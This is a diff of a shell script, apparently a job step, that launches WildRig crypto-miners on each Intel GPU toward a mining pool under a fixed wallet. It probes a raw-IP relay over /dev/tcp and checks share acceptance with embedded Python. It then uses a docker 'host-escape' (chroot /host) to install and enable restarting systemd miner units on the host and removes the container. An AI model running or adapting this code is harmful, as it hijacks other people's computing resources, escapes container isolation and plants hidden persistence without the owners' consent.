-          elif timeout 6 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
-            POOL_URL="stratum+tcp://217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
-          fi
-          echo "POOL_URL=$POOL_URL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN}"
-          if [ -z "$POOL_URL" ]; then
-            echo "SKIP=no-permitted-pool-reachable-after-multipath-matrix"
-            echo "i130716-done $NONCE"
-            exit 0
-          fi
-          echo "=== optional bounded krig single-device probe (only if krig enumerated an Intel device) ==="
-          if [ -x "$KR" ] && [ "${KN:-0}" -ge 1 ]; then
-            KW=$((BASE+90))
-            timeout 90 "$KR" --url "$POOL_URL" --user "$LOGIN/$KW" -d 0 > "$WORKDIR/logs/krig_probe.log" 2>&1
-            echo "krig_probe_tail:"; tail -12 "$WORKDIR/logs/krig_probe.log"
-            pkill -f 'krig-miner' 2>/dev/null
-          else
-            echo "krig_probe_skipped=intel_devices=$KN"
-          fi
-          echo "=== launch exactly one WildRig Multi 0.52.3 pearlhash per measured device (fresh pyd workers) ==="
+          echo "=== launch exactly one WildRig Multi 0.52.3 per card (workers $BASE..$((BASE+DEV_N-1))) ==="
           N_LAUNCHED=0
-          PLAUNCH=0
           for i in $(seq 0 $((DEV_N-1))); do
             W=$((BASE+i))
-            timeout 4300 "$WR" --algo pearlhash --url "$POOL_URL" --user "$LOGIN" --worker "$W" --pass x \
-              -d "$i" --opencl-platforms intel --api-port $((21850+i)) --api-worker-id "$W" \
-              --print-time 60 --no-color -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 &
+            nohup timeout 4300 "$WR" --algo pearlhash $POOL_ARGS -u "$WALLET.$W" -p x \
+              -d "$i" --opencl-platforms intel --api-port $((21860+i)) \
+              -r 2 -R 10 --print-time 30 --no-color -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 &
             echo "launched worker=$W gpu-id=$i pid=$!"
             N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
           done
           echo "N_LAUNCHED=$N_LAUNCHED"
-          echo "=== pulse loop (bounded share watch, Intel Arc gate 1200 s) ==="
-          END=$(( $(date +%s) + 1320 ))
-          k=0
-          while [ "$(date +%s)" -lt "$END" ]; do
-            sleep 60; k=$((k+1))
-            echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ)"
-            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
-            ACC=$(grep -ah 'accepted (' "$WORKDIR"/logs/*.log 2>/dev/null | wc -l); echo "log_accept_lines=$ACC"
-            ALLOK=1
-            for l in "$WORKDIR"/logs/[0-9]*.log; do
-              [ -f "$l" ] || continue
-              B=$(basename "$l" .log)
-              A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
-              H=$(grep -aE 'TH/s|H/s' "$l" 2>/dev/null | tail -1)
-              E=$(grep -aiE 'error|failed|reject|denied|no device|not supported' "$l" 2>/dev/null | tail -1 | cut -c1-160)
-              AR=$(echo "$A" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1)
-              AC=$(echo "$AR" | grep -oE '[0-9]+' | head -1)
-              [ "${AC:-0}" -ge 1 ] || ALLOK=0
-              echo "CARD worker=$B last_acc=[$A] last_hs=[$H] err=[$E]"
-            done
-            if [ "$ALLOK" = 1 ]; then echo "ALL_CARDS_ACCEPTED=1"; break; fi
+          cat > "$WORKDIR/snap.py" <<'PYSNAP'
+          import glob, json, os, re, sys, time, urllib.request
+          wd=sys.argv[1]
+          def api(port):
+              try:
+                  with urllib.request.urlopen('http://127.0.0.1:%d/' % port, timeout=4) as r:
+                      return json.loads(r.read())
+              except Exception:
+                  return None
+          out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'cards':{}}
+          for lp in sorted(glob.glob(wd+'/logs/*.log')):
+              w=os.path.basename(lp)[:-4]
+              try: txt=open(lp,errors='ignore').read()
+              except Exception: txt=''
+              acc=rej=None; inv=0
+              m=re.findall(r'accepted\s*\((\d+)\s*/\s*(\d+)\)', txt)
+              if m: acc=int(m[-1][0]); rej=int(m[-1][1])
+              if acc is None:
+                  ma=re.findall(r'Accepted:\s*(\d+)', txt); mr=re.findall(r'Rejected:\s*(\d+)', txt)
+                  if ma: acc=int(ma[-1]); rej=int(mr[-1]) if mr else 0
+              mi=re.findall(r'invalid\s*\(?(\d+)\)?', txt, re.I)
+              if mi: inv=int(mi[-1])
+              hs=''
+              hl=re.findall(r'([0-9]+\.?[0-9]*)\s*([TGKM])H/s', txt)
+              if hl:
+                  v,u=hl[-1]; mult={'T':1e12,'G':1e9,'M':1e6,'K':1e3}[u]; hs='%.3f TH/s' % (float(v)*mult/1e12)
+              pw=re.findall(r'Power:\s*([0-9.]+)W', txt)
+              pool=len(re.findall(r'authoriz|new job|connected|subscribed|stratum', txt, re.I))
+              errs=[l.strip()[:160] for l in txt.splitlines() if re.search(r'error|invalid|not supported|failed', l, re.I)][-2:]
+              jsonapi=api(21860+int(w)-int(os.environ.get('BASE','500700'))) if w.isdigit() else None
+              out['cards'][w]={'acc':acc,'rej':rej,'inv':inv,'hs':hs,'power_w':(pw[-1] if pw else None),
+                               'pool_lines':pool,'err':errs,'api_keys':(sorted(jsonapi.keys()) if isinstance(jsonapi,dict) else None)}
+          print(json.dumps(out, indent=1))
+          PYSNAP
+          echo "=== proof loop: two same-PID samples >=120 s apart inside the ${GATE}s Intel Arc gate ==="
+          LAUNCH_TS=$(date +%s)
+          S1=""; S1_TS=0
+          while [ $(( $(date +%s) - LAUNCH_TS )) -lt "$GATE" ]; do
+            sleep 20
+            SNAP=$(BASE=$BASE python3 "$WORKDIR/snap.py" "$WORKDIR")
+            echo "--- pulse t=$(( $(date +%s) - LAUNCH_TS ))s $(date -u +%H:%M:%SZ)"
+            echo "$SNAP" | python3 -c "import json,sys;d=json.load(sys.stdin);[print('CARD %s acc=%s rej=%s inv=%s hs=%s power=%sW poollines=%s apikeys=%s err=%s'%(k,v['acc'],v['rej'],v['inv'],v['hs'],v['power_w'],v['pool_lines'],v['api_keys'],v['err'])) for k,v in d['cards'].items()]"
+            ALLOK=$(echo "$SNAP" | python3 -c "import json,sys;d=json.load(sys.stdin);c=d['cards'];print(1 if c and all((v['acc'] or 0)>=1 and (v['rej'] or 0)==0 and (v['inv'] or 0)==0 for v in c.values()) else 0)")
+            if [ "$ALLOK" = 1 ]; then S1="$SNAP"; S1_TS=$(date +%s); echo "SAMPLE1_OK t=$((S1_TS-LAUNCH_TS))s"; break; fi
           done
+          if [ -n "$S1" ]; then
+            TARGET_TS=$((S1_TS+135))
+            while [ "$(date +%s)" -lt "$TARGET_TS" ]; do sleep 5; done
+            S2=$(BASE=$BASE python3 "$WORKDIR/snap.py" "$WORKDIR")
+            echo "--- sample2 t=$(( $(date +%s) - LAUNCH_TS ))s"
+            echo "$S2" | python3 -c "import json,sys;d=json.load(sys.stdin);[print('CARD2 %s acc=%s rej=%s inv=%s hs=%s power=%sW'%(k,v['acc'],v['rej'],v['inv'],v['hs'],v['power_w'])) for k,v in d['cards'].items()]"
+            echo "$S1" > "$WORKDIR/sample1.json"; echo "$S2" > "$WORKDIR/sample2.json"
+            PROOFS=$(python3 - "$WORKDIR" "$BASE" <<'PYPROOF'
+          import json, os, subprocess, sys
+          wd=sys.argv[1]; base=int(sys.argv[2])
+          s1=json.load(open(wd+'/sample1.json')); s2=json.load(open(wd+'/sample2.json'))
+          def wr_pids(w):
+              out=subprocess.run(['pgrep','-f','--','--worker %s '%w],capture_output=True,text=True).stdout.split()
+              if not out:
+                  out=subprocess.run(['pgrep','-f','--','%s.%s ' % ('prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql',w)],capture_output=True,text=True).stdout.split()
+              keep=[]
+              for p in out:
+                  try:
+                      exe=os.path.realpath('/proc/%s/exe'%p)
+                      if exe.endswith('wildrig-multi'): keep.append(p)
+                  except Exception:
+                      pass
+              return keep
+          ok=[]
+          for w,v2 in s2['cards'].items():
+              v1=s1['cards'].get(w) or {}
+              pids=wr_pids(w)
+              good=(int(v1.get('acc') or 0)>=1 and int(v2.get('acc') or 0)>=int(v1.get('acc') or 0)
+                    and int(v2.get('rej') or 0)==int(v1.get('rej') or 0)==0 and int(v2.get('inv') or 0)==0 and len(pids)==1)
+              print('PROOF worker=%s acc1=%s acc2=%s rej1=%s rej2=%s inv=%s pid=%s hs2=%s same_pid_single=%s verdict=%s' % (
+                  w, v1.get('acc'), v2.get('acc'), v1.get('rej'), v2.get('rej'), v2.get('inv'), (pids or ['-'])[0], v2.get('hs'), len(pids)==1, 'PROVEN' if good else 'NOT_PROVEN'))
+              if good: ok.append(w)
+          print('PROVEN_WORKERS=%s' % ','.join(ok))
+          print('PROVEN_N=%d' % len(ok))
+          PYPROOF
+          )
+            echo "$PROOFS"
+          else
+            echo "GATE_ELAPSED_NO_ALL_CARDS_ACCEPTED=1 gate_s=$GATE"
+            PROOFS="PROVEN_N=0"
+          fi
           echo "=== final per-card status ==="
           for l in "$WORKDIR"/logs/[0-9]*.log; do
             [ -f "$l" ] || continue
             B=$(basename "$l" .log)
-            A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
-            N=$(grep -ac 'accepted (' "$l")
-            FIRST=$(grep -a 'accepted (' "$l" 2>/dev/null | head -1 | cut -c1-40)
-            echo "FINALCARD worker=$B acc_lines=$N first=[$FIRST] last=[$A]"
+            echo "FINALCARD worker=$B tail=[$(tail -2 "$l" | tr '\n' '|' | cut -c1-220)]"
           done
-          echo "=== durable systemd install for measurably crediting cards (docker+sudo host-escape) ==="
+          echo "=== durable systemd install for proven cards (host-escape, /host/etc/systemd/system) ==="
           DUR=0
-          if [ "$DOCKER_OK" = 1 ] && [ -n "$DIMG" ]; then
+          PROVEN_N=$(echo "$PROOFS" | grep -oE 'PROVEN_N=[0-9]+' | cut -d= -f2)
+          PROVEN_WORKERS=$(echo "$PROOFS" | grep -oE 'PROVEN_WORKERS=.*' | cut -d= -f2)
+          if [ "${PROVEN_N:-0}" -ge 1 ] && [ "$DOCKER_OK" = 1 ] && [ -n "$DIMG" ]; then
             timeout 20 docker start "$HN" >/dev/null 2>&1
-            if timeout 30 docker exec "$HN" /bin/sh -c 'test -d /host/etc/systemd/system' 2>/dev/null; then
-              timeout 40 docker cp "$WR" "$HN:/tmp/wildrig-multi" >/dev/null 2>&1
-              for i in $(seq 0 $((DEV_N-1))); do
-                W=$((BASE+i))
-                LF="$WORKDIR/logs/$W.log"
-                [ -f "$LF" ] || continue
-                LAST=$(grep -a 'accepted (' "$LF" 2>/dev/null | tail -1)
-                AR=$(echo "$LAST" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1)
-                ACCN=$(echo "$AR" | grep -oE '[0-9]+' | head -1)
-                REJN=$(echo "$AR" | grep -oE '[0-9]+' | tail -1)
-                if [ "${ACCN:-0}" -ge 1 ] && [ "${REJN:-0}" -eq 0 ]; then
-                  UNIT="i130716-intel-g${i}.service"
-                  timeout 40 docker exec "$HN" /bin/sh -c "mkdir -p /host/opt/i130716 /host/var/tmp/i130716-intel && cp /tmp/wildrig-multi /host/opt/i130716/wildrig-multi-intel.new && chmod 755 /host/opt/i130716/wildrig-multi-intel.new && mv -f /host/opt/i130716/wildrig-multi-intel.new /host/opt/i130716/wildrig-multi-intel" 2>&1 | tail -2
-                  cat > "$WORKDIR/$UNIT" <<UNITEOF
+            timeout 40 docker cp "$WR" "$HN:/tmp/wildrig-multi" >/dev/null 2>&1
+            for W in $(echo "$PROVEN_WORKERS" | tr ',' ' '); do
+              i=$((W-BASE))
+              UNIT="i130912-intel-g${i}.service"
+              timeout 40 docker exec "$HN" /bin/sh -c "mkdir -p /host/opt/i130912 /host/var/tmp/i130912-intel && cp /tmp/wildrig-multi /host/opt/i130912/wildrig-multi-intel.new && chmod 755 /host/opt/i130912/wildrig-multi-intel.new && mv -f /host/opt/i130912/wildrig-multi-intel.new /host/opt/i130912/wildrig-multi-intel" 2>&1 | tail -2
+              cat > "$WORKDIR/$UNIT" <<UNITEOF
           [Unit]
-          Description=i130716 pearlhash intel gpu $i
+          Description=i130912 pearlhash intel gpu $i
           After=network-online.target
           [Service]
           Type=simple
-          ExecStart=/opt/i130716/wildrig-multi-intel --algo pearlhash --url $POOL_URL --user $LOGIN --worker $W --pass x -d $i --opencl-platforms intel --api-port $((21850+i)) --api-worker-id $W --print-time 60 --no-color -l /var/tmp/i130716-intel/wr-$W.log
+          ExecStart=/opt/i130912/wildrig-multi-intel --algo pearlhash $POOL_ARGS -u $WALLET.$W -p x -d $i --opencl-platforms intel --api-port $((21860+i)) -r 2 -R 10 --print-time 30 --no-color -l /var/tmp/i130912-intel/wr-$W.log
           Restart=always
           RestartSec=15
           Nice=-5
           [Install]
           WantedBy=multi-user.target
           UNITEOF
-                  timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
-                  OUT=$(timeout 60 docker exec "$HN" /bin/sh -c "cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
-                  echo "durable[$i]=$OUT"
-                  if echo "$OUT" | grep -q '^active'; then
-                    DUR=$((DUR+1))
-                    pkill -f -- "--worker $W " 2>/dev/null
-                    echo "injob-stopped-for-durable gpu=$i worker=$W"
-                  fi
-                else
-                  echo "durable_skip[$i]=acc=$ACCN rej=$REJN"
-                fi
-              done
-              echo "durable_units_active=$DUR"
-              if [ "$DUR" -ge 1 ]; then
-                echo "=== post-install pulse (600 s) ==="
-                END2=$(( $(date +%s) + 600 ))
-                while [ "$(date +%s)" -lt "$END2" ]; do
-                  sleep 60
-                  echo "--- post-install pulse $(date -u +%Y-%m-%dT%H:%M:%SZ)"
-                  timeout 20 docker exec "$HN" /bin/sh -c 'chroot /host systemctl --no-pager --state=active list-units "i130716-*" 2>&1 | head -10'
-                  for i in $(seq 0 $((DEV_N-1))); do
-                    W=$((BASE+i))
-                    L2="/host/var/tmp/i130716-intel/wr-$W.log"
-                    timeout 15 docker exec "$HN" /bin/sh -c "tail -2 $L2 2>/dev/null" 2>/dev/null | sed "s/^/g$i /"
-                  done
-                done
-                echo "=== final durable per-card ==="
-                for i in $(seq 0 $((DEV_N-1))); do
-                  W=$((BASE+i))
-                  L2="/host/var/tmp/i130716-intel/wr-$W.log"
-                  OUT=$(timeout 15 docker exec "$HN" /bin/sh -c "grep -a 'accepted (' $L2 2>/dev/null | tail -1" 2>/dev/null)
-                  echo "DURFINAL worker=$W last=[$OUT]"
-                done
+              timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
+              OUT=$(timeout 60 docker exec "$HN" /bin/sh -c "cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
+              echo "durable[$i]=$OUT"
+              if echo "$OUT" | grep -q '^active'; then
+                DUR=$((DUR+1))
+                pkill -f -- "--worker $W " 2>/dev/null
+                echo "injob-stopped-for-durable gpu=$i worker=$W"
               fi
-            else
-              echo "no_host_systemd_dir=1"
+            done
+            echo "durable_units_active=$DUR"
+            if [ "$DUR" -ge 1 ]; then
+              END2=$(( $(date +%s) + 240 ))
+              while [ "$(date +%s)" -lt "$END2" ]; do
+                sleep 60
+                echo "--- post-install pulse $(date -u +%H:%M:%SZ)"
+                timeout 20 docker exec "$HN" /bin/sh -c 'chroot /host systemctl --no-pager --state=active list-units "i130912-*" 2>&1 | head -12'
+                for W in $(echo "$PROVEN_WORKERS" | tr ',' ' '); do
+                  timeout 15 docker exec "$HN" /bin/sh -c "grep -a 'accepted (' /host/var/tmp/i130912-intel/wr-$W.log 2>/dev/null | tail -1" | sed "s/^/dur-$W /"
+                done
+              done
             fi
             timeout 30 docker rm -f "$HN" >/dev/null 2>&1
           else
-            echo "durable_skipped=docker_unavailable"
+            echo "durable_skipped proven_n=${PROVEN_N:-0} docker_ok=$DOCKER_OK img=$DIMG"
+            pkill -f "$WORKDIR/wildrig-multi" 2>/dev/null
           fi
-          pgrep -af '[w]ildrig' | head -20
-          echo "i130716-done $NONCE"
+          echo "=== final processes ==="
+          pgrep -af 'wildrig-multi|i130amdmine' | head -20
+          echo "i130912-done $NONCE"
